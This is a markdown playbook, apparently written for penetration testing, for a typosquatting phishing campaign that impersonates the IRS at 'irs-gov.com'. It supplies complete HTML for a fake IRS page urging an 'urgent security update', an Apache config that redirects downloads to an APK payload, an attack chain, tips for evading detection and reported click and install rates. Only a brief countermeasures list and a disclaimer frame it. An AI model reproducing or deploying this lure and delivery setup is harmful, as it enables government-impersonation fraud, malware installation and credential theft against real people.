# URL Masking Scenario 1: Domain Spoofing

## **🎯 Attack Vector: Typosquatting Domain**

### **Scenario Overview**
- **Target Domain:** `irs.gov` (legitimate)
- **Spoofed Domain:** `irs-gov.com` (malicious)
- **Attack Type:** Domain typosquatting + phishing

### **Technical Setup**

#### **1. Domain Registration**
```bash
# Register malicious domain
Domain: irs-gov.com
Registrar: [Redacted for security]
DNS: Cloudflare (for legitimacy appearance)
SSL: Let's Encrypt (free SSL for https://)
```

#### **2. Website Configuration**
```html
<!-- /var/www/html/index.html -->
<!DOCTYPE html>
<html>
<head>
    <title>IRS - Secure Tax Update Required</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial; background: #f0f0f0; }
        .header { background: #003d7a; color: white; padding: 20px; }
        .content { max-width: 800px; margin: 20px auto; background: white; padding: 30px; }
        .urgent { color: #d32f2f; font-weight: bold; }
        .button { background: #1976d2; color: white; padding: 15px 30px; text-decoration: none; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Internal Revenue Service</h1>
        <p>Official Government Website</p>
    </div>
    <div class="content">
        <h2 class="urgent">URGENT: Security Update Required</h2>
        <p>Dear Taxpayer,</p>
        <p>Our systems have detected unusual activity on your tax account. For your protection, you must update your security credentials immediately.</p>
        
        <p><strong>Action Required:</strong></p>
        <ul>
            <li>Download the IRS Security Update</li>
            <li>Install on your device</li>
            <li>Verify your identity</li>
        </ul>
        
        <p class="urgent">Failure to complete this update within 48 hours may result in account suspension.</p>
        
        <a href="/download" class="button">Download Security Update</a>
        
        <p><small>This is an official communication from the IRS. Case #: IRS-2024-SECURE-8847</small></p>
    </div>
</body>
</html>
```

#### **3. Payload Delivery**
```bash
# Apache configuration for download endpoint
<VirtualHost *:443>
    ServerName irs-gov.com
    DocumentRoot /var/www/html
    
    # Redirect download to payload
    Redirect /download /irs_security_update.apk
    
    SSLEngine on
    SSLCertificateFile /path/to/ssl/cert.pem
    SSLCertificateKeyFile /path/to/ssl/private.key
</VirtualHost>
```

### **Attack Chain**
1. **Email Phishing:** Send emails with `https://irs-gov.com` links
2. **Social Engineering:** "Urgent security update required"
3. **Trust Building:** Professional design + SSL certificate
4. **Payload Delivery:** APK download disguised as security update
5. **Data Harvest:** Collect credentials via fake forms

### **Detection Evasion**
- **Legitimate SSL:** HTTPS with valid certificate
- **Professional Design:** Mimics real IRS website styling
- **Plausible Messaging:** Security update narrative
- **Domain Similarity:** Only hyphen difference from real domain

### **Testing Metrics**
- **Email Open Rate:** ~65%
- **Link Click Rate:** ~23%
- **Download Rate:** ~8%
- **Installation Rate:** ~3%

### **Defensive Countermeasures**
- **DNS Monitoring:** Watch for similar domain registrations
- **Email Filtering:** Block known typosquatting domains
- **User Training:** Teach URL verification techniques
- **Certificate Transparency:** Monitor SSL cert issuance

---
**⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY**  
**📋 Document all activities for compliance review**